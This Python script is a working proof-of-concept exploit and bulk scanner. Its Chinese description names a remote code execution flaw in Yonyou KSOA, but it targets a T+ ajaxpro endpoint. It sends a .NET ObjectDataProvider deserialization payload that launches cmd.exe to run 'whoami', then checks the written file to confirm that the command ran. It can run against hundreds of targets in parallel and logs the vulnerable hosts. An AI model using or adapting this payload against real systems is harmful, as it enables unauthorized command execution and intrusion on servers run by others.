import requests
import re
import argparse
import sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """                                                                     
 ___.__. ____   ____    ____ ___.__. ____  __ __ 
<   |  |/  _ \ /    \  / ___<   |  |/  _ \|  |  \
 \___  (  <_> )   |  \/ /_/  >___  (  <_> )  |  /
 / ____|\____/|___|  /\___  // ____|\____/|____/ 
 \/                \//_____/ \/                  
                               author:gtman       
"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="用友时空KSOA存在RCE漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help="Please input link")
    parser.add_argument('-f', '--file', dest='file', type=str, help="Please input file path")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding="utf-8") as f:
            for line in f.readlines():
                url_list.append(line.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python {sys.argv[0]} -h")

def poc(target):
    headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
    "X-Ajaxpro-Method": "GetStoreWarehouseByStore",
    "Accept": "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2",
    "Connection": "close",
    "Content-type": "application/x-www-form-urlencoded"
}

    data = {
    "storeID": {
        "__type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
        "MethodName": "Start",
        "ObjectInstance": {
            "__type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
            "StartInfo": {
                "__type": "System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
                "FileName": "cmd", 
                "Arguments": "/c whoami > test.txt"
            }
        }
    }
}
    proxies = {
        'http': "http://127.0.0.1:8080",
        'https': "http://127.0.0.1:8080"
    }
    payload = '/tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore'
    try:
        response = requests.post(url=target + payload, headers=headers,data=data, verify=False)
        if response.status_code == 200 and 'error' in response.text:
            header = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
                }
            p = '/tplus/test.txt'
            res = requests.get(url=target + p, headers=headers,verify=False,proxies=proxies)
            if res.status_code == 200 and '404' not in res.text and '错误信息' not in res.text and "登录" not in res.text:
                print(f"[*] 该站点 {target} 可能存在存在RCE漏洞,请手动检测")
                with open("result2.txt", "a") as fp:
                    fp.write(f"{target}" + "\n")
            else:
                print(f"[-] 该站点 {target} 不存在RCE漏洞")
    except Exception as e:
        print(f"[+] 该站点 {target} 存在访问问题，请手工测试")

if __name__ == "__main__":
    main()